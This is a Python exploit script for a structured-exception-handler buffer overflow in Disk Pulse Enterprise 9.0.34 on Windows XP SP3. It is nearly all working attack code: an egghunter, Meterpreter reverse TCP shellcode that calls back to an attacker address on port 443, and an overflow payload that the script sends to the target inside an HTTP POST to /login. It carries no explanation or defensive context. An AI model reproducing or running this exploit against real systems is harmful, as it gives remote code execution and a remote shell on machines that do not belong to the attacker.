# Disk Pulse Enterprise 9.0.34 BOF Structured Exception Handler
# Tested on Windows XP Professional SP3

import socket

host = '192.168.219.161'
port = 80

# Bad Chars Identified \x00 \x0A \x0D \x26 
# POP POP RETN 0x100267d2

egghunter =  ""
egghunter += "\xd9\xcd\xd9\x74\x24\xf4\xb8\x8c\x8c\x42\x84\x5b"
egghunter += "\x31\xc9\xb1\x0f\x83\xc3\x04\x31\x43\x16\x03\x43"
egghunter += "\x16\xe2\x79\x33\x82\x42\xe3\xdb\xd9\x9b\x3a\x97"
egghunter += "\xf9\xef\xe7\x69\xcb\xa1\x1e\xbb\xb0\xd3\x23\xc0"
egghunter += "\x54\x57\x20\xf4\xd9\x35\xc3\xb2\x57\xcb\xed\x4d"
egghunter += "\x35\xcb\x0b\x87\x69\xca\x2d\xcb\x06\xbf\x68\x58"
egghunter += "\x01\xcc\xc5\xab\xb3\xe7\xf9\x4a\x27\x7c\xb2\xe1"
egghunter += "\x23\x10"

# windows/meterpreter/reverse_ord_tcp LHOST=192.168.219.132 LPORT=443 EXITFUNC=thread
shellcode =  ""
shellcode += "\xb8\x32\xa3\xce\x7d\xda\xc6\xd9\x74\x24\xf4\x5b"
shellcode += "\x29\xc9\xb1\x1f\x31\x43\x12\x03\x43\x12\x83\xf1"
shellcode += "\xa7\x2c\x88\x2f\x6a\x0f\x74\x16\x6c\xa2\xa2\xdc"
shellcode += "\xab\xb6\x0f\x35\x7d\x87\xa8\x74\x07\xf0\x4b\xb4"
shellcode += "\xf3\x03\x36\x2b\xc7\xef\xe8\x61\x57\x9b\xb0\x7a"
shellcode += "\x31\xa4\x23\x07\x70\xf4\xd2\x17\xc8\xd1\x1e\x11"
shellcode += "\x07\x93\xc7\x58\x80\xe8\x42\x18\xe6\xe4\x8c\x4f"
shellcode += "\x0b\x96\x24\x8f\xb3\xc8\xe9\xf5\x7e\x10\xd5\x07"
shellcode += "\x3f\xd5\x18\x70\x6e\x9b\x7c\x08\x9e\xa3\x94\xb0"
shellcode += "\x51\xb5\x6e\xe5\xad\xf7\x16\x09\x84\x4b\x5e\xff"
shellcode += "\x39\x67\xd7\xb9\xbf\x50\x48\xd1\x79\x90\x6d\xc8"
shellcode += "\x21\xb0\x7d\xc7\x19\xe5\x3b\x6b\x1e\xcd\xfc\xba"
shellcode += "\x10\xc5\xa3"

payload = 'njoffsec' * 1250 + 'nijonijo' + shellcode + '\x90\x90\x90' + 'njoffsec' * 515 + '\x90\x90\xeb\x07' + '\xD2\x67\x02\x10' + '\x90\x90\x90\x90\x90' + egghunter + '\x90\x90\x90\x90\x90' + 'njoffsec' * 702 + 'nj'

evil = ""
evil += "POST /login HTTP/1.1\r\n"
evil += "Host: " + host + "\r\n"
evil += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-US,en;q=0.5\r\n"
evil += "Accept-Encoding: gzip, deflate\r\n"
evil += "Referer: http://" + host +"/login\r\n"
evil += "DNT: 1\r\n"
evil += "Connection: close\r\n"
evil += "Upgrade-Insecure-Requests: 1\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 20000\r\n\r\n"
evil += "username=admin&password=admin"
evil += payload

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((host, port))
s.send(evil)
s.close()
